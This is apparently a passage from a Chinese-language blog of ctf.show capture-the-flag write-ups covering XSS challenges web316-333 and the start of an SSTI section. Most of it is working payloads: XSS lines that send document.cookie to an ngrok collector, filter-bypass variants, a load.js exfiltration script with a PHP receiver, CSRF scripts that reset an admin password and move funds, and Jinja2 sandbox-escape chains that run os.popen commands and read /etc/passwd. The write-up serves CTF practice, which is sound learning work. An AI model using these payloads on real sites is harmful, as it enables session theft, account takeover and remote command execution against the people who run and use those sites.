class="line">((q=)|(s=)|(search=)|(id=)|(lang=)|(keyword=)|(query=)|(page=)|(keywords=)|(year=)|(view=)|(email=)|(type=)|(name=)|(p=)|(month=)|(immagine=)|(list_type=)|(url=)|(terms=)|(categoryid=)|(key=)|(l=)|(begindate=)|(enddate=)|(message=)|(user=)|(type_name=)|(status=))</span><br></pre></td></tr></table></figure><p>添加正则匹配</p><h1 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h1><p>过滤了script</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body onload=&quot;document.location.href=&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie&quot;&gt;&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe onload=&quot;window.open(&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405160931275.png" alt="image-20220405160931275"></p><h1 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;document.location.href=&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie&quot;&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure><h1 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;document.location.href=&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie&quot;&gt;&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframeonload=&quot;window.open(&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><h1 id="web320-326"><a href="#web320-326" class="headerlink" title="web320-326"></a>web320-326</h1><p>把空格过滤了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405191207472.png" alt="image-20220405191207472"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405191152855.png" alt="image-20220405191152855"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%09 TAB水平</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0c新建一页</span><br><span class="line">%0dreturn功能</span><br><span class="line">%0bTAB(垂直)</span><br><span class="line">%a0空格</span><br></pre></td></tr></table></figure><p>空格的替换方式,我们都试一下</p><p>%09的替换可以</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;bodyonload=&quot;document.location.href=&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie&quot;&gt;&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;svgonload=&quot;window.open(&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;inputonfocus=&quot;window.open(&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie)&quot;autofocus&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframeonload=&quot;window.open(&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>%0c的替换可以</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svgonload=&quot;window.open(&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;inputonfocus=&quot;window.open(&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie)&quot;autofocus&gt;</span><br><span class="line"></span><br><span class="line">&lt;bodyonload=&quot;document.location.href=&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie&quot;&gt;&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframeonload=&quot;window.open(&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.open(&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input/onfocus=&quot;window.open(&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie)&quot;/autofocus&gt;</span><br><span class="line"></span><br><span class="line">&lt;body/onload=&quot;document.location.href=&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie&quot;&gt;&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe/onload=&quot;window.open(&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>别的会出现这个样子,可以自己尝试一下,感觉可行</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405193205662.png" alt="image-20220405193205662"></p><h1 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405211412442.png" alt="image-20220405211412442"></p><p>xss盲打就好</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405211710498.png" alt="image-20220405211710498"></p><p>收件人要填admin哦</p><h1 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405212809419.png" alt="image-20220405212809419"></p><p>有四个页面,都盲打试一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405212826900.png" alt="image-20220405212826900"></p><p>  没得到flag,得到俩sessid,应该有个自己的,都试一下吧</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405213151236.png" alt="image-20220405213151236"></p><p>记得要改两次哦</p><h1 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h1><p>这道题目和上一道差不多,但是是模拟的cookie会过期怎么办,那么我们可以通过这样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.location.href=&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这是之前的方法,也就是直接将cookie发送到php页面</p><p>现在我们将js直接嵌入他的html上面,当然这里可以直接写进去密码里面,也可以通过远程加载一个js文件的方式来执行js,仔细思考一下就会发现其他网页的js文件好像也是这么加载的吧</p><p>创建一个load.js</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;http://fb53-111-17-194-91.ngrok.io/accept.php?q=&quot;</span>+<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#top &gt; div.layui-container &gt; div:nth-child(4) &gt; div &gt; div.layui-table-box &gt; div.layui-table-body.layui-table-main&#x27;</span>).<span class="property">textContent</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">append</span>(img);</span><br></pre></td></tr></table></figure><p>至于这里为什么这么写,我也不会,大概含义通过定位把用户名和密码给取出来,然后发送到accept.php</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405214657340.png" alt="image-20220405214657340"></p><p>在创建一个accept.php用来接收flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>]; <span class="variable">$myFile</span> = <span class="string">&quot;cookie.txt&quot;</span>; <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$myFile</span>, <span class="variable">$cookie</span>, FILE_APPEND); <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>接着插入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=http://fb53-111-17-194-91.ngrok.io/load.js&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;document.location.href=&#x27;http://fb53-111-17-194-91.ngrok.io/load.js&#x27;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>思路是这样的,但是不知道为什么load.js就是不访问accept.php文件.可能是代码有问题</p><h1 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405222113792.png" alt="image-20220405222113792"></p><p>有一个修改密码页面,没有验证码,也没有源密码验证,可能存在xsrf</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405222128926.png" alt="image-20220405222128926"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=&#x27;http://127.0.0.1/api/change.php?p=123&#x27;;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>接着我们就使用admin 123登录就好了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405222336255.png" alt="image-20220405222336255"></p><h1 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405222500502.png" alt="image-20220405222500502"></p><p>易得post提交,我们试试3位的密码行不行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&#x27;api/change.php&#x27;,type:&#x27;post&#x27;,data:&#123;p:&#x27;123&#x27;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405222645919.png" alt="image-20220405222645919"></p><p>骗人这不也行吗</p><h1 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405222804645.png" alt="image-20220405222804645"></p><p>我们看看admin有钱吗</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&#x27;api/change.php&#x27;,type:&#x27;post&#x27;,data:&#123;p:&#x27;123&#x27;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>不让登</p><p>我们也可以让admin给我们转钱</p><p>先注册一个test收钱</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt; $.ajax(&#123;url:&#x27;http://127.0.0.1/api/amount.php&#x27;,type:&#x27;post&#x27;,data:&#123;u:&#x27;test&#x27;,a:&#x27;10000&#x27;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405225612141.png" alt="image-20220405225612141"></p><p>有钱的</p><p>来转个负数试试</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405223138599.png" alt="image-20220405223138599"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405223206618.png" alt="image-20220405223206618"></p><p>这个人穷死了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405223228380.png" alt="image-20220405223228380"></p><p>那我们在试试让别人买flag呢,其实是不行的这不就是花别人的钱给别人买东西吗.如果能把别人买的东西发回来说不定可以哦</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405223423586.png" alt="image-20220405223423586"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&#x27;/api/getFlag.php&#x27;,type:&#x27;post&#x27;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h1><p>我想的是我们创建账号就有五块,只要我们创建的账号足够多,就可以达到.不过有点麻烦</p><p>还有可以我们有五块钱,能不能给自己转钱会不会越转越多,我们试试,我们要转四块哦,转五块钱不够,就离谱,我不是有五块吗</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405224654748.png" alt="image-20220405224654748"></p><p>多点几下发现可以的</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405224721929.png" alt="image-20220405224721929"></p><p>接着intruder自己玩一下就好</p><p>接着我们也可以让admin给我们转钱</p><p>先注册一个test收钱</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt; $.ajax(&#123;url:&#x27;http://127.0.0.1/api/amount.php&#x27;,type:&#x27;post&#x27;,data:&#123;u:&#x27;test&#x27;,a:&#x27;10000&#x27;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405225406115.png" alt="image-20220405225406115"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI</title>
      <link href="/ctfshow/ctf.show/SSTI/"/>
      <url>/ctfshow/ctf.show/SSTI/</url>
      
        <content type="html"><![CDATA[<h1 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h1><h2 id="SSTI原理"><a href="#SSTI原理" class="headerlink" title="SSTI原理"></a>SSTI原理</h2><p><a href="https://jiang-niao.github.io/2020/04/02/SSTi%20%E5%85%A8%E8%A7%A3%E6%9E%90/#SSTi-%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%BE%85%E6%9B%B4%E6%96%B0%EF%BC%89">SSTi学习</a></p><p><a href="https://www.anquanke.com/post/id/188172">SSTI沙盒逃逸</a></p><p>网址输入“{undefined{7+7}}”页面显示14，说面存在“SSTI” ：</p><p>SSTI也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎(下面会提到)，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako tornado django，php的smarty twig，java的jade velocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p><strong>常用方法</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__class__           查看对象所在的类</span><br><span class="line">__mro__             查看继承关系和调用顺序，返回元组</span><br><span class="line">__base__            返回基类</span><br><span class="line">__bases__           返回基类元组</span><br><span class="line">__subclasses__()    返回子类列表</span><br><span class="line">__init__            调用初始化函数，可以用来跳到__globals__</span><br><span class="line">__globals__         返回函数所在的全局命名空间所定义的全局变量，返回字典</span><br><span class="line">__builtins__        返回内建内建名称空间字典</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如:a.xxx/a.xxx()）都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line">__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;cycler.__init__.__globals__.os.popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量</span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()</span><br><span class="line">request.args.x1    get传参</span><br><span class="line">request.values.x1  所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1    post传参(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data   post传参(Content-Type:a/b)</span><br><span class="line">request.json post传json  (Content-Type: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>过滤器</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int()将值转换为int类型；</span><br><span class="line"></span><br><span class="line">float()将值转换为float类型；</span><br><span class="line"></span><br><span class="line">lower()将字符串转换为小写；</span><br><span class="line"></span><br><span class="line">upper()将字符串转换为大写；</span><br><span class="line"></span><br><span class="line">title()把值中的每个单词的首字母都转成大写；</span><br><span class="line"></span><br><span class="line">capitalize()把变量值的首字母转成大写，其余字母转小写；</span><br><span class="line"></span><br><span class="line">trim()截取字符串前面和后面的空白字符；</span><br><span class="line"></span><br><span class="line">wordcount()计算一个长字符串中单词的个数；</span><br><span class="line"></span><br><span class="line">reverse()字符串反转；</span><br><span class="line"></span><br><span class="line">replace(value,old,new)替换将old替换为new的字符串；</span><br><span class="line"></span><br><span class="line">truncate(value,length=255,killwords=False)截取length长度的字符串；</span><br><span class="line"></span><br><span class="line">striptags()删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；</span><br><span class="line"></span><br><span class="line">escape()或e转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。</span><br><span class="line"></span><br><span class="line">safe()禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;|safe&#125;&#125;；</span><br><span class="line"></span><br><span class="line">list()将变量列成列表；</span><br><span class="line"></span><br><span class="line">string()将变量转换成字符串；</span><br><span class="line"></span><br><span class="line">join()将一个序列中的参数值拼接成字符串。示例看上面payload；</span><br><span class="line"></span><br><span class="line">abs()返回一个数值的绝对值；</span><br><span class="line"></span><br><span class="line">first()返回一个序列的第一个元素；</span><br><span class="line"></span><br><span class="line">last()返回一个序列的最后一个元素；</span><br><span class="line"></span><br><span class="line">format(value,arags,*kwargs)格式化字符串。比如：&#123;&#123;&quot;%s&quot; - &quot;%s&quot;|format(&#x27;Hello?&#x27;,&quot;Foo!&quot;) &#125;&#125;将输出：Helloo? - Foo!</span><br><span class="line"></span><br><span class="line">length()返回一个序列或者字典的长度；</span><br><span class="line"></span><br><span class="line">sum()返回列表内数值的和；</span><br><span class="line"></span><br><span class="line">sort()返回排序后的列表；</span><br><span class="line"></span><br><span class="line">default(value,default_value,boolean=false)如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#x27;xiaotuo&#x27;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。</span><br><span class="line"></span><br><span class="line">length()返回字符串的长度，别名是count</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>利用链</strong></p><p>python2、python3 通用 payload（因为每个环境使用的python库不同 所以类的排序有差异）</p><p>直接使用 popen（python2不行）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">os._wrap_close 类里有popen</span><br><span class="line"></span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen(&#x27;whoami&#x27;).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用 os 下的 popen</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">含有 os 的基类都可以，如 linecache</span><br><span class="line"></span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用<code>__import__</code>下的os（python2不行）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以使用 __import__ 的 os</span><br><span class="line"></span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>__builtins__</code>下的多个函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__builtins__下有eval，__import__等的函数，可以利用此来执行命令</span><br><span class="line"></span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用 python2 的 file 类读取文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在 python3 中 file 类被删除</span><br><span class="line"></span><br><span class="line"># 读文件</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#x27;etc/passwd&#x27;).read()</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#x27;etc/passwd&#x27;).readlines()</span><br><span class="line"># 写文件</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__bases__[0].__subclasses__()[40](&#x27;/tmp&#x27;).write(&#x27;test&#x27;)</span><br><span class="line"># python2的str类型不直接从属于属于基类，所以要两次 .__bases__</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flask内置函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flask内置函数和内置对象可以通过&#123;&#123;self.__dict__._TemplateReference__context.keys()&#125;&#125;查看，然后可以查看一下这几个东西的类型，类可以通过__init__方法跳到os，函数直接用__globals__方法跳到os。（payload一下子就简洁了）</span><br><span class="line"></span><br><span class="line">&#123;&#123;self.__dict__._TemplateReference__context.keys()&#125;&#125;</span><br><span class="line">#查看内置函数</span><br><span class="line">#函数：lipsum、url_for、get_flashed_messages</span><br><span class="line">#类：cycler、joiner、namespace、config、request、session</span><br><span class="line">&#123;&#123;lipsum.__globals__.os.popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">#函数</span><br><span class="line">&#123;&#123;cycler.__init__.__globals__.os.popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">#类</span><br><span class="line">如果要查config但是过滤了config直接用self.__dict__就能找到里面的config</span><br></pre></td></tr></table></figure><p>通用 getshell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原理就是找到含有 __builtins__ 的类，然后利用</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">#读写文件</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="注入思路"><a href="#注入思路" class="headerlink" title="注入思路"></a>注入思路</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.随便找一个内置类对象用__class__拿到他所对应的类</span><br><span class="line">2.用__bases__拿到基类（&lt;class &#x27;object&#x27;&gt;）</span><br><span class="line">3.用__subclasses__()拿到子类列表</span><br><span class="line">4.在子类列表中直接寻找可以利用的类getshell</span><br><span class="line"></span><br><span class="line">对象→类→基本类→子类→__init__方法→__globals__属性→__builtins__属性→eval函数</span><br></pre></td></tr></table></figure><h2 id="payload解释"><a href="#payload解释" class="headerlink" title="payload解释"></a>payload解释</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">关于python魔术方法payload：&quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;/etc/passwd&quot;).read() 的解释  </span><br><span class="line"># 获得一个字符串实例</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;</span><br><span class="line">&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"># 获得字符串的type实例</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__ </span><br><span class="line">&lt;type &#x27;str&#x27;&gt;</span><br><span class="line"></span><br><span class="line"># 获得其父类</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__</span><br><span class="line">(&lt;type &#x27;str&#x27;&gt;, &lt;type &#x27;basestring&#x27;&gt;, &lt;type &#x27;object&#x27;&gt;)</span><br><span class="line"></span><br><span class="line"># 获得父类中的object类</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2] </span><br><span class="line">&lt;type &#x27;object&#x27;&gt;</span><br><span class="line"></span><br><span class="line"># 获得object类的子类，但发现这个__subclasses__属性是个方法</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__</span><br><span class="line">&lt;built-in method __subclasses__ of type object at 0x10376d320&gt;</span><br><span class="line"></span><br><span class="line"># 使用__subclasses__()方法，获得object类的子类</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__() </span><br><span class="line">[&lt;type &#x27;type&#x27;&gt;, &lt;type &#x27;weakref&#x27;&gt;, &lt;type &#x27;weakcallableproxy&#x27;&gt;, &lt;type &#x27;weakproxy&#x27;&gt;, &lt;type &#x27;int&#x27;&gt;, &lt;type &#x27;basestring&#x27;&gt;, &lt;type &#x27;bytearray&#x27;&gt;, &lt;type &#x27;list&#x27;&gt;, &lt;type &#x27;NoneType&#x27;&gt;, &lt;type &#x27;NotImplementedType&#x27;&gt;, &lt;type &#x27;traceback&#x27;&gt;, &lt;type &#x27;super&#x27;&gt;, &lt;type &#x27;xrange&#x27;&gt;, &lt;type &#x27;dict&#x27;&gt;, &lt;type &#x27;set&#x27;&gt;, &lt;type &#x27;slice&#x27;&gt;, &lt;type &#x27;staticmethod&#x27;&gt;, &lt;type &#x27;complex&#x27;&gt;, &lt;type &#x27;float&#x27;&gt;, &lt;type &#x27;buffer&#x27;&gt;, &lt;type &#x27;long&#x27;&gt;, &lt;type &#x27;frozenset&#x27;&gt;, &lt;type &#x27;property&#x27;&gt;, &lt;type &#x27;memoryview&#x27;&gt;, &lt;type &#x27;tuple&#x27;&gt;, &lt;type &#x27;enumerate&#x27;&gt;, &lt;type 